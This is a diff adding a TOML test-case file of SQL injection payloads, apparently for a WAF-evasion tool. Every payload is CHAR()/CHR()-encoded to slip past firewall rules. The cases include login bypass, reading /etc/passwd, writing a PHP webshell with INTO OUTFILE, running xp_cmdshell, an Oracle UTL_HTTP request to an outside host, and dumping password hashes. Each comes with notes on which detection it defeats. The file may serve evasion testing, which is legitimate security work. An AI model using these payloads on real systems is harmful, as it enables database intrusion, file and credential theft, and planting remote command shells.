@@ -1,0 +1,88 @@
+schema = 1
+# SQL injection payloads pre-encoded with the `sql_char_decompose` (MySQL/
+# MSSQL `CHAR(N,N,...)`) and `pg_chr_decompose` (Postgres/Oracle
+# `(CHR(N)||CHR(N)||...)`) tampers. Distinct from `concat_split_2026`
+# because the output contains NO single-quoted ASCII tokens — defeats
+# both literal-substring rules AND CONCAT-shaped rules.
+#
+# Manual form:
+#   wafrift evade --only tamper/sql_char_decompose --payload "1 OR u='admin'"
+#   wafrift evade --only tamper/pg_chr_decompose   --payload "1 OR u='admin'"
+
+# ── MySQL/MSSQL CHAR() variadic family ──
+
+[[case]]
+id = "char_decompose_admin_login"
+class = "sql"
+payload = "1 OR username=CHAR(97,100,109,105,110)--"
+description = "OR username='admin' — codepoint args, no quoted tokens; CRS literal-string rules and CONCAT regex both miss."
+
+[[case]]
+id = "char_decompose_load_file_etc_passwd"
+class = "sql"
+payload = "1' UNION SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100)),NULL--"
+description = "LOAD_FILE('/etc/passwd') — full path as CHAR() codepoints; LFI path-traversal regex blind."
+
+[[case]]
+id = "char_decompose_into_outfile_php_shell"
+class = "sql"
+payload = "1' UNION SELECT CHAR(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,49,93,41,59,63,62) INTO OUTFILE CHAR(47,118,97,114,47,119,119,119,47,115,46,112,104,112)--"
+description = "INTO OUTFILE webshell drop with both PHP payload AND destination path as CHAR()-encoded byte arrays."
+
+[[case]]
+id = "char_decompose_mssql_xp_cmdshell"
+class = "sql"
+payload = "1; EXEC xp_cmdshell(CHAR(110,101,116,32,117,115,101,114))--"
+description = "MSSQL xp_cmdshell('net user') — common privilege-discovery via CHAR()-encoded command."
+
+[[case]]
+id = "char_decompose_extractvalue_db_leak"
+class = "sql"
+payload = "1' AND EXTRACTVALUE(1,CONCAT(CHAR(126),(SELECT database())))--"
+description = "Error-based DB-name leak; the leading-tilde delimiter (~ = 126) is CHAR-encoded to dodge `0x7e`-pattern regex."
+
+# ── Postgres/Oracle CHR() pipe-concat family ──
+
+[[case]]
+id = "chr_decompose_admin_login_pg"
+class = "sql"
+payload = "1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--"
+description = "Postgres OR username='admin' — pipe-concat is SQL-standard but some WAFs block || aggressively; CHR() lets through where CHAR() wouldn't."
+
+[[case]]
+id = "chr_decompose_pg_read_file"
+class = "sql"
+payload = "1' UNION SELECT pg_read_file((CHR(47)||CHR(101)||CHR(116)||CHR(99)||CHR(47)||CHR(112)||CHR(97)||CHR(115)||CHR(115)||CHR(119)||CHR(100)),0,1000),NULL--"
+description = "Postgres pg_read_file('/etc/passwd') — superuser-only function; path as CHR() pipe-concat."
+
+[[case]]
+id = "chr_decompose_oracle_utl_http"
+class = "sql"
+payload = "1 AND UTL_HTTP.REQUEST((CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(97)||CHR(116)||CHR(116)||CHR(46)||CHR(99)||CHR(111)||CHR(109)))=1--"
+description = "Oracle UTL_HTTP SSRF — http://att.com URL as CHR() pipe-concat. Path-traversal + SSRF regex blind."
+
+[[case]]
+id = "chr_decompose_pg_sleep_blind"
+class = "sql"
+payload = "1; SELECT pg_sleep(5)--"
+description = "Trivial Postgres time-based; no string literal so CHR() decompose is a no-op. Included for the bench to verify the tamper is idempotent on payloads it doesn't apply to (negative-case coverage)."
+
+[[case]]
+id = "chr_decompose_oracle_dba_users_dump"
+class = "sql"
+payload = "1' UNION SELECT username,(CHR(124)||password_hash||CHR(124)) FROM dba_users--"
+description = "Oracle dba_users hash dump with CHR(124)='|' framing chars; the pipe-separator regex used by some leak-detection rules sees the framing as part of identifiers."
+
+# ── Mixed: payload with both CONCAT-shape AND CHAR-shape (composition) ──
+
+[[case]]
+id = "char_decompose_mixed_with_concat"
+class = "sql"
+payload = "1 OR (SELECT CONCAT(CHAR(97,100,109),CHAR(105,110)))=username--"
+description = "Composition test: outer CONCAT() takes two CHAR()-decoded halves of 'admin'. Tests that the tamper composes cleanly with other SQL-shape obfuscations."
+
+[[case]]
+id = "char_decompose_in_substring_blind"
+class = "sql"
+payload = "1 AND SUBSTRING(version(),1,1)=CHAR(56)--"
+description = "Blind boolean: is first char of version() '8' (codepoint 56)? CHAR(56) hides the comparison constant from rules matching `version().*=.*['\\\"]`."
